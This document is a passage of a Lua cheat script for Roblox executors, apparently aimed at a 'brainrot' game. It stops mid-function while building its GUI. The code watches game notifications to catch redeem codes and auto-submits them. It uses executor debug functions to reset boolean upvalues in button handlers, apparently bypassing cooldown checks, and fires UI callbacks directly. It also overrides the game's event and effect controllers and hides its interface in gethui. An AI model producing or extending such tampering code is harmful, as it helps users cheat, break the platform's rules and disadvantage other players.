local cloneref = cloneref or function(x) return x end

local Players           = cloneref(game:GetService("Players"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local UserInputService  = cloneref(game:GetService("UserInputService"))
local TweenService      = cloneref(game:GetService("TweenService"))
local RunService        = cloneref(game:GetService("RunService"))

local localPlayer = Players.LocalPlayer
local PlayerGui   = localPlayer:WaitForChild("PlayerGui")
local Net         = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local keyboardEnabled = UserInputService.KeyboardEnabled
local touchOnly       = UserInputService.TouchEnabled and not keyboardEnabled

local getupvalues_    = debug and debug.getupvalues or getupvalues
local getconnections_ = getconnections or (debug and debug.getconnections)
local setupvalue_     = debug and debug.setupvalue or setupvalue
local writeClipboard  = setclipboard or toclipboard or (syn and syn.write_clipboard)

local savedSettings = {}

if readfile and isfile then
    local ok, contents = pcall(function()
        if isfile("redeemer_settings.txt") then
            return readfile("redeemer_settings.txt")
        end
    end)
    if ok and type(contents) == "string" then
        for line in contents:gmatch("[^\n]+") do
            local key, value = line:match("^(%w+)=(.*)$")
            if key then savedSettings[key] = value end
        end
    end
end

function _G.__RdmCfgBool(key, default)
    local v = savedSettings[key]
    if v == "1" then return true end
    if v == "0" then return false end
    return default
end

function _G.__RdmCfgStr(key, default)
    local v = savedSettings[key]
    return (type(v) == "string" and v ~= "" and v) or default
end

function _G.__RdmCfgSet(key, value)
    savedSettings[key] = type(value) == "boolean"
        and (value and "1" or "0")
        or tostring(value)
    if not writefile then return end
    local lines = {}
    for k, v in pairs(savedSettings) do
        lines[#lines + 1] = k .. "=" .. tostring(v)
    end
    table.sort(lines)
    pcall(writefile, "redeemer_settings.txt", table.concat(lines, "\n"))
end

local CONFIG = {
    listenKey = Enum.KeyCode.F,
    maxFeed   = 36,
    positions = {
        Top = true, Bottom = true, Center = true, Middle = true,
        Left = true, Right = true,
        TopRight = true, TopLeft = true, BottomRight = true, BottomLeft = true,
    },
}

local SPEED_PRESETS = { MAX = 0.15 }

local uiScale
local maxSpamDelay        = SPEED_PRESETS.MAX
local wordMode            = false
local retryDelay          = 0.5
local isListening         = false
local autoRedeem          = _G.__RdmCfgBool("autoRedeem", true)
local autoType            = _G.__RdmCfgBool("autoType", true)
local manual              = _G.__RdmCfgBool("manual", false)
local isSpamming          = false
local spamThread          = nil
local spamCount           = 0
local wordsToCollect      = 1
local listenKey           = CONFIG.listenKey
local redeemKey           = Enum.KeyCode.G
local rebindingTarget     = nil
local listenedWords       = {}
local lastAutoTyped       = nil
local notifyRemote        = nil
local remoteFallbackUsed  = false
local autoListen          = _G.__RdmCfgBool("autoListen", true)
local spamOnListen        = _G.__RdmCfgBool("spamOnListen", true)
local showKeybinds        = _G.__RdmCfgBool("showKeybinds", keyboardEnabled)
local ignoreSystemPhrases = _G.__RdmCfgBool("ignoreSystem", true)

_G.__RdmDuo = _G.__RdmCfgBool("duo", false)

local function stripTags(s)
    if type(s) ~= "string" then return tostring(s) end
    return (s:gsub("<[^>]->", ""))
end

local function trim(s)
    return (s or ""):gsub("^%s+", ""):gsub("%s+$", "")
end

local function copyToClipboard(text)
    if not writeClipboard then return false end
    return (pcall(writeClipboard, text))
end

local function extractWords(s)
    local out = {}
    for word in s:gmatch("[%w_]+") do out[#out + 1] = word end
    return out
end

local function pickCodeCandidate(s)
    local candidate
    for word in s:gmatch("[%w_]+") do
        if #word >= 4 and word:match("%a") and (word:match("%u") or word:match("%d")) then
            candidate = word
        end
    end
    if candidate then return candidate end
    for word in s:gmatch("[%w_]+") do
        if #word >= 4 then return word end
    end
end

function _G.__SabClassifyDrop(raw)
    local text  = tostring(raw or "")
    local lower = text:lower()

    local words = {}
    for w in text:gmatch("[%w']+") do words[#words + 1] = w end
    local wordCount = #words
    if wordCount == 0 then return nil end

    local padded = " " .. lower:gsub("[^%w]", " ") .. " "

    if lower:find("?", 1, true) then return "riddle" end

    for _, phrase in ipairs({
        " what ", " how ", " which ", " whose ", " when ", " who ",
        " whats ", " where ", " why ", " guess ", " riddle ", " answer ",
    }) do
        if padded:find(phrase, 1, true) then return "riddle" end
    end

    if padded:find(" my ", 1, true) then return "riddle" end

    local multiword = wordCount >= 2
    local hasPlus = multiword and (padded:find(" plus ", 1, true) or lower:find("+", 1, true))
    if hasPlus then return "riddle" end

    if wordCount >= 4 and padded:find(" and ", 1, true) then return "riddle" end

    if lower:find("code", 1, true) then return "code" end
    for _, phrase in ipairs({ " redeem ", " type ", " enter ", " claim " }) do
        if padded:find(phrase, 1, true) then return "code" end
    end

    if wordCount >= 7 then return "riddle" end
    if wordCount == 1 then return "code" end

    if wordCount <= 3 then
        local good = 0
        for _, w in ipairs(words) do
            if #w >= 3 and ((w == w:upper() and w:match("%a")) or w:match("%d")) then
                good = good + 1
            end
        end
        if good == wordCount then return "code" end
    end

    return nil
end

local function computeUIScale()
    if not touchOnly then return 1 end
    local cam = workspace.CurrentCamera
    cam = cam and cam.ViewportSize.Y or 600
    local sizeName = (_G.__RdmCfgStr and _G.__RdmCfgStr("uiSize", "MEDIUM")) or "MEDIUM"
    local mult = sizeName == "BIG" and 1.15 or sizeName == "SMALL" and 0.8 or 1
    return math.clamp(cam * 0.88 / 548, 0.5, 1.3) * mult
end
uiScale = computeUIScale()

local extractCodeAfterTrigger

do
    local patterns = {
        leads = {
            "use", "using", "redeem", "type", "enter", "claim",
            "with", "grab", "got", "here is", "heres", "here's",
            "there is", "theres", "there's",
        },
        articles = {
            "", "the%s+", "a%s+", "an%s+", "this%s+", "your%s+", "new%s+",
        },
        patterns = {
            "code%s+is", "codes?%s+are", "code%s+for", "code%s+to%s+use",
            "code%s*[:%-]", "new%s+code", "free%s+code", "secret%s+code",
            "working%s+code", "another%s+code",
        },
        names = { "sammy" },
    }

    for _, lead in ipairs(patterns.leads) do
        local esc = lead:gsub("%s+", "%%s+")
        for _, article in ipairs(patterns.articles) do
            patterns.patterns[#patterns.patterns + 1] = esc .. "%s+" .. article .. "code"
        end
    end

    local function firstCodeWordTail(s)
        for pos, word in s:gmatch("()([%w_]+)") do
            if #word >= 4 and word:match("%a") and (word:match("%u") or word:match("%d")) then
                return s:sub(pos)
            end
        end
    end

    extractCodeAfterTrigger = function(raw)
        local lower = raw:lower()
        local bestEnd, bestFlag

        local function scan(pat, plain, flag)
            local i = 1
            while true do
                local ok, s, e = pcall(string.find, lower, pat, i, plain)
                if not ok or not s then break end
                if not bestEnd or e > bestEnd then
                    bestEnd = e
                    bestFlag = flag
                end
                i = e + 1
            end
        end

        for _, pat in ipairs(patterns.patterns) do scan(pat, false, false) end

        if lower:find("code") then
            for _, name in ipairs(patterns.names) do
                scan(name:lower(), true, true)
            end
        end

        if not bestEnd then return nil end

        local tail = raw:sub(bestEnd + 1)
        local code = firstCodeWordTail(tail)
        if bestFlag then return code end
        return code or ""
    end
end

local findNotificationRemote

do
    local function remoteInstancesOf(func)
        if not getupvalues_ then return {} end
        local ok, ups = pcall(getupvalues_, func)
        local out = {}
        if ok and ups then
            for _, v in pairs(ups) do
                if typeof(v) == "Instance"
                   and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction") or v:IsA("UnreliableRemoteEvent"))
                   and v.Parent == Net then
                    table.insert(out, v)
                end
            end
        end
        return out
    end

    findNotificationRemote = function()
        local ok, mod = pcall(function()
            return require(ReplicatedStorage.Controllers:FindFirstChild("NotificationController", true))
        end)
        if ok and type(mod) == "table" and type(mod.Start) == "function" then
            return remoteInstancesOf(mod.Start)[1]
        end
    end
end

local setCodeBoxText, submitCode

do
    local function findCodeBox()
        local codes = PlayerGui:FindFirstChild("Codes")
        if not codes then return nil end
        local main = (codes:FindFirstChild("Codes") or codes):FindFirstChild("Main")
        local box = main and main:FindFirstChild("TextBox")
        if box and box:IsA("TextBox") then return box end
        for _, d in ipairs(codes:GetDescendants()) do
            if d:IsA("TextBox") then return d end
        end
    end

    local function findConfirmButton()
        local codes = PlayerGui:FindFirstChild("Codes")
        if not codes then return nil end
        local codes2 = codes:FindFirstChild("Codes") or codes
        local confirm = (codes2:FindFirstChild("Main") or codes2):FindFirstChild("Confirm")
        if confirm and (confirm:IsA("ImageButton") or confirm:IsA("TextButton")) then
            return confirm
        end
        local fallback
        for _, d in ipairs(codes:GetDescendants()) do
            if d:IsA("ImageButton") or d:IsA("TextButton") then
                local n = d.Name:lower()
                if n:find("confirm") or n:find("submit") or n:find("redeem") or n:find("enter") then
                    return d
                end
                fallback = fallback or d
            end
        end
        return fallback
    end

    local function clearBooleans(fn, depth)
        if not (fn and setupvalue_ and getupvalues_) then return end
        depth = depth or 1
        local ok, ups = pcall(getupvalues_, fn)
        if ok and type(ups) == "table" then
            for k, v in pairs(ups) do
                if type(v) == "boolean" then
                    pcall(setupvalue_, fn, k, false)
                elseif type(v) == "function" and depth > 0 then
                    clearBooleans(v, depth - 1)
                end
            end
        end
    end

    local function fireConnections(signal, ...)
        if not getconnections_ then return false end
        local ok, conns = pcall(getconnections_, signal)
        if not ok or type(conns) ~= "table" or #conns == 0 then return false end

        local args = table.pack(...)
        local any = false
        for _, c in ipairs(conns) do
            if c.Enabled ~= false then
                local cb
                pcall(function() cb = c.Function end)
                clearBooleans(cb)

                local ok2
                if cb then
                    ok2 = pcall(task.spawn, cb, table.unpack(args, 1, args.n))
                else
                    ok2 = pcall(function() c:Fire(table.unpack(args, 1, args.n)) end)
                end
                any = any or ok2
            end
        end
        return any
    end

    setCodeBoxText = function(text)
        if type(text) ~= "string" or text == "" then return end
        local box = findCodeBox()
        if not box then return end
        pcall(function()
            if box.Text ~= text then box.Text = text end
        end)
    end

    local function trySubmitViaConnections(text)
        if not getconnections_ then return false, "no getconnections" end
        local box = findCodeBox()
        if not box then return false, "code box not found" end
        pcall(function()
            box.Text = text
            box.Active = true
            box.Selectable = true
        end)

        local confirm = findConfirmButton()
        local ok = false
        if confirm then
            local a = fireConnections(confirm.MouseButton1Click)
            local b = fireConnections(confirm.Activated)
            ok = a or b or false
        end
        if not ok then
            ok = fireConnections(box.FocusLost, true) or ok
        end
        return ok, ok and "submitted" or "no submit control"
    end

    local function trySubmitViaFocus(text)
        local box = findCodeBox()
        if not box then return false, "code box not found" end
        if not pcall(function()
            box.Text = text
            box:CaptureFocus()
        end) then
            return false, "focus failed"
        end
        task.wait(0.1)
        local ok = pcall(function() box:ReleaseFocus(true) end)
        return ok, ok and "submitted" or "release failed"
    end

    submitCode = function(text)
        local ok, msg = trySubmitViaConnections(text)
        if ok then return true, msg end
        if getconnections_ then return false, msg end
        return trySubmitViaFocus(text)
    end
end

local eventBlock = {
    ready = false,
    why   = "EventController unavailable",
    IsBlocked = function() return false end,
}

do
    local function requireController(name)
        local folder = ReplicatedStorage:FindFirstChild("Controllers")
        folder = folder and folder:FindFirstChild(name, true)
        if not (folder and folder:IsA("ModuleScript")) then return nil end
        local ok, mod = pcall(require, folder)
        if ok and type(mod) == "table" then return mod end
    end

    local EventController  = requireController("EventController")
    local EffectController = requireController("EffectController")

    local valid = EventController
        and type(EventController.Events) == "table"
        and type(EventController.Execute) == "function"

    if not valid then
        eventBlock.why = "EventController missing Events/Execute"
    else
        local tool = _G.__BrainrotEventTool
        if not tool then
            tool = {}
            _G.__BrainrotEventTool = tool
        end

        tool.origExecute   = tool.origExecute   or EventController.Execute
        tool.origGetActive = tool.origGetActive or EventController.GetActiveEvents
        if EffectController then
            tool.origRun = tool.origRun or EffectController.Run
        end
        tool.fakes        = tool.fakes        or {}
        tool.capture      = tool.capture      or {}
        tool.spawned      = tool.spawned      or {}
        tool.clearedAttrs = tool.clearedAttrs or {}
        tool.stashed      = tool.stashed      or {}
        if tool.blocked == nil then tool.blocked = false end

        eventBlock.S = tool
        eventBlock.IsBlocked = function() return tool.blocked and true or false end

        local effectsTable
        local getupvalue_ = debug and debug.getupvalue
        if getupvalue_ then
            local ok, v = pcall(getupvalue_, tool.origExecute, 5)
            if ok and type(v) == "table" then effectsTable = v end
        end

        if not tool.shimmed then
            EventController.GetActiveEvents = function(self)
                local list = {}
                if not tool.blocked then
                    local ok, res = pcall(tool.origGetActive, self)
                    if ok and type(res) == "table" then
                        for _, e in pairs(res) do list[#list + 1] = e end
                    end
                end
                for _, fake in pairs(tool.fakes) do list[#list + 1] = fake end
                return list
            end
            tool.shimmed = true
        end

        local function refreshControllers()
            local lighting = requireController("LightingController")
            if lighting and type(lighting.Update) == "function" then
                pcall(function() lighting:Update() end)
            end
            local sound = requireController("SoundController")
            if sound and type(sound.UpdateOST) == "function" then
                pcall(function() sound:UpdateOST() end)
            end
        end

        local function isSkyEffect(inst)
            return inst:IsA("Sky") or inst:IsA("Atmosphere")
                or inst:IsA("Clouds") or inst:IsA("PostEffect")
        end

        local function stopAllEffects()
            if not (EffectController and type(EffectController.ActiveEffects) == "table") then
                return 0
            end
            local keys = {}
            for k in pairs(EffectController.ActiveEffects) do keys[#keys + 1] = k end
            for _, k in ipairs(keys) do
                local def = type(EffectController.Effects) == "table"
                    and EffectController.Effects[k] or nil
                EffectController.ActiveEffects[k] = nil
                if type(def) == "table" then
                    if type(def.OnUpdate) == "function" then pcall(function() def:OnUpdate() end) end
                    if type(def.OnStop) == "function"   then pcall(function() def:OnStop() end)   end
                end
            end
            return #keys
        end

        local ATTR_KEEP = {
            EventsLoaded = true, NextCrystalEvent = true, CrystalEventLastTime = true,
            SantaMerchantStockId = true, SantaMerchantNextStockId = true,
            FuseMachineLuck = true, FuseMachineLuckTimer = true,
        }
        local EVENT_ATTRS = {
            "AyMiGatitoEvent", "ChicleteiraBicicleteiraEvent", "EasterEvent",
            "ExtinctEvent", "IndonesiaEvent", "MeowlEvent", "MexicoEvent",
            "RipMyGrannyEvent", "SkibidiEvent", "StPatricksEvent",
            "StrawberryEvent", "TrickOrTreatEvent", "ValentinesEvent",
            "YinYangEvent", "WitchingHourEvent",
        }
        local FX_NAMES = { "Lighting", "WallRecolor", "Atmosphere" }

        local function updateFx()
            if not (EffectController and type(EffectController.Effects) == "table") then return end
            for _, name in ipairs(FX_NAMES) do
                local fx = EffectController.Effects[name]
                if fx and type(fx.OnUpdate) == "function" then
                    pcall(function() fx:OnUpdate() end)
                end
            end
        end

        local function clearEventAttrs()
            local set = {}
            for _, n in ipairs(EVENT_ATTRS) do set[n] = true end
            local cleared = 0
            for k, v in pairs(ReplicatedStorage:GetAttributes()) do
                if type(k) == "string" and v == true and not ATTR_KEEP[k] then
                    if set[k] or k:find("Event") or k:find("Phase") or k:find("Hour") then
                        pcall(function() ReplicatedStorage:SetAttribute(k, nil) end)
                        tool.clearedAttrs[k] = true
                        cleared = cleared + 1
                    end
                end
            end
            updateFx()
            return cleared
        end

        local function restoreEventAttrs()
            local n = 0
            for k in pairs(tool.clearedAttrs) do
                pcall(function() ReplicatedStorage:SetAttribute(k, true) end)
                n = n + 1
            end
            table.clear(tool.clearedAttrs)
            updateFx()
            return n
        end

        local function stopLoopedSounds()
            local n = 0
            for _, d in ipairs(workspace:GetDescendants()) do
                if d:IsA("Sound") and d.Playing and d.Looped then
                    pcall(function() d:Stop() end)
                    n = n + 1
                end
            end
            return n
        end

        local function restoreStashed()
            local n = 0
            for k, parent in pairs(tool.stashed) do
                if typeof(k) == "Instance" then
                    pcall(function() k.Parent = parent end)
                    n = n + 1
                end
                tool.stashed[k] = nil
            end
            return n
        end

        local function getEffectsApi()
            local e = _G.Effects
            if type(e) == "table"
               and type(e.Block) == "function"
               and type(e.Unblock) == "function" then
                return e
            end
        end

        eventBlock.Block = function()
            local api = getEffectsApi()
            if api then
                api.Block()
                tool.blocked = true
                return true, "blocked (effects panel)"
            end

            local cancelled = 0
            for k, ev in pairs(EventController.Events) do
                if type(ev) == "table" and rawget(ev, "Active") then
                    local ok = type(EventController.Cancel) == "function"
                        and pcall(function() return EventController:Cancel(k) end)
                    if not ok then
                        rawset(ev, "Active", false)
                        rawset(ev, "__started", false)
                    end
                    cancelled = cancelled + 1
                end
            end

            local effectsKilled = stopAllEffects()

            for k, cap in pairs(tool.capture) do
                if type(cap) == "table" and type(cap.caught) == "table" then
                    for inst in pairs(cap.caught) do
                        if typeof(inst) == "Instance" and inst.Parent and not isSkyEffect(inst) then
                            pcall(function() inst:Destroy() end)
                        end
                    end
                end
                tool.capture[k] = nil
            end

            table.clear(tool.spawned)
            table.clear(tool.fakes)

            if effectsTable then
                for k, group in pairs(effectsTable) do
                    if type(group) == "table" then
                        for _, inst in ipairs(group) do
                            if typeof(inst) == "Instance" and not isSkyEffect(inst) then
                                pcall(function() inst:Destroy() end)
                            end
                        end
                    end
                    effectsTable[k] = nil
                end
            end

            EventController.Execute = function() return false end
            if EffectController then
                EffectController.Run = function() return false, false end
            end

            tool.blocked = true
            refreshControllers()
            clearEventAttrs()

            local sounds = stopLoopedSounds()
            return true, ("blocked %d event(s), %d fx, %d sound(s)")
                :format(cancelled, effectsKilled, sounds)
        end

        eventBlock.Unblock = function()
            local api = getEffectsApi()
            if api then
                api.Unblock()
                tool.blocked = false
                return true, "unblocked (effects panel)"
            end

            EventController.Execute = tool.origExecute
            if EffectController and tool.origRun then
                EffectController.Run = tool.origRun
            end
            tool.blocked = false

            local attrs = restoreEventAttrs()
            local models = restoreStashed()
            refreshControllers()
            return true, ("unblocked - %d flag(s), %d model(s) restored"):format(attrs, models)
        end

        eventBlock.ready = true
        eventBlock.why   = nil
    end
end

local THEME = {
    bg     = Color3.fromRGB(8, 6, 11),
    panel  = Color3.fromRGB(19, 14, 23),
    panel2 = Color3.fromRGB(31, 23, 37),
    line   = Color3.fromRGB(48, 36, 54),
    acc    = Color3.fromRGB(214, 104, 36),
    acc2   = Color3.fromRGB(166, 72, 20),
    accHi  = Color3.fromRGB(236, 150, 84),
    txt    = Color3.fromRGB(234, 226, 214),
    sub    = Color3.fromRGB(150, 138, 152),
    ok     = Color3.fromRGB(116, 186, 96),
    err    = Color3.fromRGB(196, 64, 64),
    warn   = Color3.fromRGB(222, 176, 86),
    input  = Color3.fromRGB(11, 8, 14),
    dark   = Color3.fromRGB(7, 4, 11),
}

local FONT_MED   = Enum.Font.GothamMedium
local FONT_BOLD  = Enum.Font.GothamBold
local FONT_BLACK = Enum.Font.GothamBlack

local function create(class, props, parent)
    local inst = Instance.new(class)
    for k, v in pairs(props or {}) do inst[k] = v end
    if parent then inst.Parent = parent end
    return inst
end

local function corner(inst, radius)
    create("UICorner", { CornerRadius = UDim.new(0, radius or 8) }, inst)
end

local function stroke(inst, color, thickness, transparency)
    return create("UIStroke", {
        Color = color or THEME.line,
        Thickness = thickness or 1,
        Transparency = transparency or 0,
    }, inst)
end

local function tween(inst, time, goal, easing)
    TweenService:Create(inst, TweenInfo.new(time, easing or Enum.EasingStyle.Quad), goal):Play()
end

local function gradient(inst, c1, c2, rotation)
    return create("UIGradient", {
        Color = ColorSequence.new(c1, c2),
        Rotation = rotation or 90,
    }, inst)
end

local function label(text, size, color, font, xAlign, parent)
    return create("TextLabel", {
        BackgroundTransparency = 1,
        Text = text,
        Font = font or FONT_MED,
        TextSize = size or 12,
        TextColor3 = color or THEME.txt,
        TextXAlignment = xAlign or Enum.TextXAlignment.Left,
    }, parent)
end

local function makeDraggable(handle, target)
    local dragging, startPos, startTarget
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
           or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = input.Position
            startTarget = target.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
           or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - startPos
            target.Position = UDim2.new(
                startTarget.X.Scale, startTarget.X.Offset + delta.X,
                startTarget.Y.Scale, startTarget.Y.Offset + delta.Y
            )
        end
    end)
end

local function createWindow(name, w, h, title)
    local win = create("Frame", {
        Name = name,
        Size = UDim2.fromOffset(w, h),
        BackgroundColor3 = THEME.bg,
        BorderSizePixel = 0,
        Active = true,
        ClipsDescendants = true,
    })
    corner(win, 14)
    gradient(win, Color3.fromRGB(20, 12, 30), Color3.fromRGB(8, 6, 11), 90)
    stroke(win, THEME.acc, 1.5, 0.45)
    if touchOnly then
        create("UIScale", { Name = "WinScale", Scale = uiScale }, win)
    end

    local bar = create("Frame", {
        Size = UDim2.new(1, 0, 0, 44),
        BackgroundColor3 = THEME.panel,
        BorderSizePixel = 0,
    }, win)
    corner(bar, 14)
    create("Frame", {
        Size = UDim2.new(1, 0, 0, 14),
        Position = UDim2.new(0, 0, 1, -14),
        BackgroundColor3 = THEME.panel,
        BorderSizePixel = 0,
    }, bar)

    local icon = create("ImageLabel", {
        Size = UDim2.fromOffset(24, 24),
        Position = UDim2.new(0, 12, 0.5, -12),
        BackgroundColor3 = THEME.panel2,
        BorderSizePixel = 0,
        Image = "rbxthumb://type=Asset&id=129730513254619&w=150&h=150",
    }, bar)
    corner(icon, 12)
    stroke(icon, THEME.acc, 1.5, 0.2)

    local titleLabel = label(title, 15, THEME.txt, FONT_BLACK, Enum.TextXAlignment.Left, bar)
    titleLabel.Size = UDim2.new(1, -80, 1, 0)
    titleLabel.Position = UDim2.fromOffset(44, 0)

    makeDraggable(bar, win)
    return win, bar, icon, titleLabel
end

local function createButton(text, parent)
    local btn = create("TextButton", {
        BackgroundColor3 = THEME.panel2,
        Text = text,
        Font = FONT_BOLD,
        TextSize = 12,
        TextColor3 = THEME.txt,
        AutoButtonColor = false,
        BorderSizePixel = 0,
    }, parent)
    corner(btn, 8)
    local st = stroke(btn, THEME.line, 1, 0.2)

    btn.MouseEnter:Connect(function()
        tween(btn, 0.12, { BackgroundColor3 = THEME.panel })
        tween(st,  0.12, { Color = THEME.acc, Transparency = 0 })
    end)
    btn.MouseLeave:Connect(function()
        tween(btn, 0.12, { BackgroundColor3 = THEME.panel2 })
        tween(st,  0.12, { Color = THEME.line, Transparency = 0.2 })
    end)
    return btn
end

local function createAccentButton(text, parent)
    local btn = create("TextButton", {
        BackgroundColor3 = THEME.acc,
        Text = text,
        Font = FONT_BLACK,
        TextSize = 13,
        TextColor3 = Color3.fromRGB(30, 12, 4),
        AutoButtonColor = false,
        BorderSizePixel = 0,
    }, parent)
    corner(btn, 8)
    gradient(btn, THEME.acc, THEME.acc2, 90)
    btn.MouseEnter:Connect(function()
        tween(btn, 0.12, { BackgroundColor3 = THEME.accHi })
    end)
    btn.MouseLeave:Connect(function()
        tween(btn, 0.12, { BackgroundColor3 = THEME.acc })
    end)
    return btn
end

local hui = (gethui and gethui()) or PlayerGui
local oldGui = hui:FindFirstChild("Traced")
if oldGui then oldGui:Destroy() end

local ScreenGui = create("ScreenGui", {
    Name = "Traced",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    DisplayOrder = 250,
}, hui)

local Main, MainBar, MainIcon, MainTitle = createWindow("Main", 316, 548, "TRACED")
Main.Position = UDim2.new(1, -340, 0.5, -274)
if touchOnly then
    Main.Position = UDim2.new(1, -math.floor(316 * uiScale) - 8, 0.5, -math.floor(548 * uiScale / 2))
end
Main.Parent = ScreenGui
MainTitle.Size = UDim2.new(1, -262, 1, 0)

corner(create("ImageLabel", {
    Name = "CityBg",
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ZIndex = 0,
    Image = "rbxthumb://type=Asset&id=96519310989847&w=420&h=420",
    ImageTransparency = 0.5,
    ImageColor3 = Color3.fromRGB(214, 130, 60),
    ScaleType = Enum.ScaleType.Crop,
}, Main), 14)

do
    local leaves = create("Frame", {
        Name = "LeavesLayer",
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ZIndex = 0,
        ClipsDescendants = true,
    }, Main)
    corner(leaves, 14)

    local palette = {
        Color3.fromRGB(236, 150, 84),
        Color3.fromRGB(214, 104, 36),
        Color3.fromRGB(166, 72, 20),
        Color3.fromRGB(255, 176, 108),
        Color3.fromRGB(230, 110, 160),
    }

    for _ = 1, 18 do
        task.spawn(function()
            task.wait(math.random() * 2.5)
            while leaves.Parent do
                local w = math.random(5, 8)
                local h = w + math.random(2, 4)
                local x = math.random()

                local leaf = create("Frame", {
                    Size = UDim2.new(0, w, 0, h),
                    AnchorPoint = Vector2.new(0.5, 0.5),
                    Position = UDim2.new(x, 0, 0, -h),
                    BackgroundColor3 = palette[math.random(#palette)],
                    BackgroundTransparency = 0.15 + math.random() * 0.3,
                    BorderSizePixel = 0,
                    ZIndex = 0,
                    Rotation = math.random(0, 359),
                }, leaves)
                corner(leaf, 999)
                create("UIGradient", {
                    Rotation = math.random(0, 359),
                    Transparency = NumberSequence.new({
                        NumberSequenceKeypoint.new(0, 0),
                        NumberSequenceKeypoint.new(1, 0.55),
                    }),
                }, leaf)

                local duration = 4 + math.random() * 2.6
                local drift = (math.random() - 0.5) * 0.3
                local spin = math.random(180, 540) * (math.random() < 0.5 and -1 or 1)

                TweenService:Create(leaf, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
                    Position = UDim2.new(x + drift, 0, 1, h * 2),
                    Rotation = leaf.Rotation + spin,
                }):Play()

                task.wait(duration)
                if leaf and leaf.Parent then leaf:Destroy() end
                task.wait(math.random() * 0.5)
            end
        end)
    end
end

local statusDotNotify = create("Frame", {
    Size = UDim2.fromOffset(8, 8),
    Position = UDim2.new(1, -212, 0.5, -4),
    BackgroundColor3 = THEME.sub,
    BorderSizePixel = 0,
    Visible = false,
}, MainBar)
corner(statusDotNotify, 4)

local RagBtn   = createButton("Rag",   MainBar)
local TestBtn  = createButton("Test",  MainBar)
local FeedBtn  = createButton("Feed",  MainBar)
local SetBtn   = createButton("Settings", MainBar)
RagBtn.Size  = UDim2.fromOffset(38, 22); RagBtn.Position  = UDim2.new(1, -200, 0.5, -11); RagBtn.TextSize  = 10
TestBtn.Size = UDim2.fromOffset(38, 22); TestBtn.Position = UDim2.new(1, -157, 0.5, -11); TestBtn.TextSize = 10
FeedBtn.Size = UDim2.fromOffset(38, 22); FeedBtn.Position = UDim2.new(1, -114, 0.5, -11); FeedBtn.TextSize = 10
SetBtn.Size  = UDim2.fromOffset(38, 22); SetBtn.Position  = UDim2.new(1, -71,  0.5, -11); SetBtn.TextSize  = 10

local expandedHeight = 548
local collapsed = false

do
    local collapse = createButton("", MainBar)
    collapse.Size = UDim2.fromOffset(22, 22)
    collapse.Position = UDim2.new(1, -28, 0.5, -11)
    corner(create("Frame", {
        Size = UDim2.fromOffset(10, 2),
        Position = UDim2.new(0.5, -5, 0.5, -1),
        BackgroundColor3 = THEME.txt,
        BorderSizePixel = 0,
    }, collapse), 1)

    local plus = create("Frame", {
        Size = UDim2.fromOffset(2, 10),
        Position = UDim2.new(0.5, -1, 0.5, -5),
        BackgroundColor3 = THEME.txt,
        BorderSizePixel = 0,
        Visible = false,
    }, collapse)
    corner(plus, 1)

    collapse.MouseButton1Click:Connect(function()
        collapsed = not collapsed
        plus.Visible = collapsed
        tween(Main, 0.25, { Size = UDim2.fromOffset(316, collapsed and 179 or expandedHeight) })
    end)
end

local content = create("Frame", {
    Size = UDim2.new(1, -20, 1, -54),
    Position = UDim2.fromOffset(10, 48),
    BackgroundTransparency = 1,
}, Main)
create("UIListLayout", {
    Padding = UDim.new(0, 5),
    SortOrder = Enum.SortOrder.LayoutOrder,
}, content)

local statusLabel
local setStatus

do
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 32),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 1,
    }, content)
    corner(row, 9)
    stroke(row, THEME.line, 1, 0.3)

    local dot = create("Frame", {
        Size = UDim2.fromOffset(8, 8),
        Position = UDim2.new(0, 12, 0.5, -4),
        BackgroundColor3 = THEME.sub,
        BorderSizePixel = 0,
    }, row)
    corner(dot, 4)

    statusLabel = label("starting...", 12, THEME.txt, FONT_BOLD, Enum.TextXAlignment.Left, row)
    statusLabel.Size = UDim2.new(1, -32, 1, 0)
    statusLabel.Position = UDim2.fromOffset(28, 0)
    statusLabel.TextTruncate = Enum.TextTruncate.AtEnd

    setStatus = function(text, kind)
        statusLabel.Text = text
        local c = kind == "ok"   and THEME.ok
              or  kind == "err"  and THEME.err
              or  kind == "busy" and THEME.acc
              or  kind == "wait" and THEME.warn
              or  THEME.txt
        statusLabel.TextColor3 = c
        dot.BackgroundColor3 = c
    end
end

local codeBox
do
    local box = create("Frame", {
        Size = UDim2.new(1, 0, 0, 50),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 2,
    }, content)
    corner(box, 9)
    stroke(box, THEME.line, 1, 0.3)

    local heading = label("CODE", 9, THEME.acc, FONT_BLACK, Enum.TextXAlignment.Left, box)
    heading.Size = UDim2.new(1, -16, 0, 11)
    heading.Position = UDim2.fromOffset(11, 5)

    codeBox = create("TextBox", {
        Size = UDim2.new(1, -18, 0, 26),
        Position = UDim2.fromOffset(9, 18),
        BackgroundColor3 = THEME.input,
        Text = "",
        PlaceholderText = "type or snipe a code...",
        PlaceholderColor3 = THEME.sub,
        Font = FONT_BLACK,
        TextSize = 14,
        TextColor3 = THEME.txt,
        ClearTextOnFocus = false,
        BorderSizePixel = 0,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, box)
    corner(codeBox, 7)

    local boxStroke = stroke(codeBox, THEME.line, 1.2, 0.25)
    create("UIPadding", {
        PaddingLeft = UDim.new(0, 9),
        PaddingRight = UDim.new(0, 9),
    }, codeBox)

    codeBox.Focused:Connect(function()
